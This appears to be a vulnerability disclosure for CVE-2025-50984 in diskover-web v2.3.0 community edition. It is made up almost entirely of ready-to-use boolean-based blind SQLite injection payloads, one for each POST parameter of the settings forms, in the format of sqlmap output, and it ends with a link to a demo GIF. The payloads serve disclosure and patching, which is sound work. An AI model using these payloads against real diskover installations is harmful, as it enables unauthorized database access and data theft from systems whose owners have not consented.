CVE-2025-50984





Version
```
diskover-web v2.3.0 community edition (ce)
```


Demo:







SQL Injection Details
```
Parameter: ES_PASS (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost&ES_PORT=9200&ES_USER=diskover&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3' AND CASE WHEN 2535=2535 THEN 2535 ELSE JSON(CHAR(73,98,110,66)) END-- ZqcS&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30&ES_MAXSIZE=20&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000
```

```
Parameter: ES_MAXSIZE (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost&ES_PORT=9200&ES_USER=diskover&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30&ES_MAXSIZE=20' AND CASE WHEN 8294=8294 THEN 8294 ELSE JSON(CHAR(82,86,87,113)) END-- HvFQ&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000
```

```
Parameter: ES_TRANSLOGSIZE (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost&ES_PORT=9200&ES_USER=diskover&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30&ES_MAXSIZE=20&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb' AND CASE WHEN 7429=7429 THEN 7429 ELSE JSON(CHAR(113,105,77,115)) END-- xTSw&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000
```

```
Parameter: ES_TIMEOUT (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost&ES_PORT=9200&ES_USER=diskover&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30' AND CASE WHEN 6998=6998 THEN 6998 ELSE JSON(CHAR(116,72,97,71)) END-- iUfI&ES_MAXSIZE=20&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000
```

```
Parameter: ES_USER (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost&ES_PORT=9200&ES_USER=diskover' AND CASE WHEN 4842=4842 THEN 4842 ELSE JSON(CHAR(121,110,69,102)) END-- QNXT&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30&ES_MAXSIZE=20&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000
```

```
Parameter: ES_HOST (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost' AND CASE WHEN 3456=3456 THEN 3456 ELSE JSON(CHAR(78,120,90,87)) END-- FVBF&ES_PORT=9200&ES_USER=diskover&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30&ES_MAXSIZE=20&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000
```

```
Parameter: ES_SCROLLSIZE (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost&ES_PORT=9200&ES_USER=diskover&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30&ES_MAXSIZE=20&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000' AND CASE WHEN 5164=5164 THEN 5164 ELSE JSON(CHAR(85,105,75,85)) END-- rtNc
```

```
Parameter: ES_CHUNKSIZE (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost&ES_PORT=9200&ES_USER=diskover&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30&ES_MAXSIZE=20&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000' AND CASE WHEN 4180=4180 THEN 4180 ELSE JSON(CHAR(86,69,88,104)) END-- sKBf&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000
```


```
Parameter: ES_PORT (POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=elasticsearchform&ES_HOST=localhost&ES_PORT=9200' AND CASE WHEN 9051=9051 THEN 9051 ELSE JSON(CHAR(108,84,100,120)) END AND 'VMnT' LIKE 'VMnT&ES_USER=diskover&ES_PASS=nb2qjfc19jg7chpb2o2vbsgqihoac20usik5et3&ES_HTTPS=false&ES_SSLVERIFICATION=true&ES_HTTPCOMPRESS=false&ES_TIMEOUT=30&ES_MAXSIZE=20&ES_MAXRETRIES=10&ES_WAIT=false&ES_CHUNKSIZE=1000&ES_INDEXREFRESH=30s&ES_TRANSLOGSIZE=1gb&ES_TRANSLOGSYNCINT=30s&ES_SCROLLSIZE=1000

```

```
Parameter: #1* ((custom) POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=diskoverform&LOGLEVEL=INFO&LOGTOFILE=false&LOGDIRECTORY=/var/log/diskover/' AND CASE WHEN 4534=4534 THEN 4534 ELSE JSON(CHAR(88,76,70,112)) END AND 'QtLi'='QtLi&MAXTHREADS=&BLOCKSIZE=512&EXCLUDES_DIRS=., .snapshot, .Snapshot, ~snapshot, ~Snapshot, .zfs&EXCLUDES_FILES=., Thumbs.db, .DS_Store, ._.DS_Store, .localized, desktop.ini&EXCLUDES_EMPTYFILES=true&EXCLUDES_EMPTYDIRS=true&EXCLUDES_MINFILESIZE=1&EXCLUDES_CHECKFILETIMES=false&EXCLUDES_MINMTIME=0&EXCLUDES_MAXMTIME=36500&EXCLUDES_MINCTIME=0&EXCLUDES_MAXCTIME=36500&EXCLUDES_MINATIME=0&EXCLUDES_MAXATIME=36500&INCLUDES_DIRS=&INCLUDES_FILES=&OWNERSGROUPS_UIDGIDONLY=false&OWNERSGROUPS_DOMAIN=false&OWNERSGROUPS_DOMAINSEP=\&OWNERSGROUPS_DOMAINFIRST=true&OWNERSGROUPS_KEEPDOMAIN=false&REPLACEPATHS_REPLACE=false&REPLACEPATHS_FROM=&REPLACEPATHS_TO=&PLUGINS_ENABLE=false&PLUGINS_DIRS=unixperms&PLUGINS_FILES=unixperms&RESTORETIMES=false
```


```
Parameter: Array-like #1* ((custom) POST)

Type: boolean-based blind

Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)

Payload: formname=webotherform&TIMEZONE=America/Vancouver' AND CASE WHEN 2801=2801 THEN 2801 ELSE JSON(CHAR(68,110,84,74)) END-- ASfW&LOGIN_REQUIRED=true&SEARCH_RESULTS=50&SIZE_FIELD=size&FILE_TYPES[]=docs&FILE_TYPES[]=doc, docx, odt, pdf, tex, wpd, wks, txt, rtf, key, odp, pps, ppt, pptx, ods, xls, xlsm, xlsx&FILE_TYPES[]=images&FILE_TYPES[]=ai, bmp, gif, ico, jpeg, jpg, png, ps, psd, psp, svg, tif, tiff, exr, tga&FILE_TYPES[]=video&FILE_TYPES[]=3g2, 3gp, avi, flv, h264, m4v, mkv, qt, mov, mp4, mpg, mpeg, rm, swf, vob, wmv, ogg, ogv, webm&FILE_TYPES[]=audio&FILE_TYPES[]=au, aif, aiff, cda, mid, midi, mp3, m4a, mpa, ogg, wav, wma, wpl&FILE_TYPES[]=apps&FILE_TYPES[]=apk, exe, bat, bin, cgi, pl, gadget, com, jar, msi, py, wsf&FILE_TYPES[]=programming&FILE_TYPES[]=c, cgi, pl, class, cpp, cs, h, java, php, py, sh, swift, vb&FILE_TYPES[]=internet&FILE_TYPES[]=asp, aspx, cer, cfm, cgi, pl, css, htm, html, js, jsp, part, php, py, rss, xhtml&FILE_TYPES[]=system&FILE_TYPES[]=bak, cab, cfg, cpl, cur, dll, dmp, drv, icns, ico, ini, lnk, msi, sys, tmp, vdi, raw&FILE_TYPES[]=data&FILE_TYPES[]=csv, dat, db, dbf, log, mdb, sav, sql, tar, xml&FILE_TYPES[]=disc&FILE_TYPES[]=bin, dmg, iso, toast, vcd, img&FILE_TYPES[]=compressed&FILE_TYPES[]=7z, arj, deb, pkg, rar, rpm, tar, gz, z, zip&FILE_TYPES[]=trash&FILE_TYPES[]=old, trash, tmp, temp, junk, recycle, delete, deleteme, clean, remove&FILE_TYPES[]=&FILE_TYPES[]=&EXTRA_FIELDS[]=&EXTRA_FIELDS[]=&MAX_INDEX=250&INDEXINFO_CACHETIME=1200&NEWINDEX_CHECKTIME=30
```

Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/diskover-web_v2.3.0_community_edition_SQLi_via_settings.gif?raw=true)

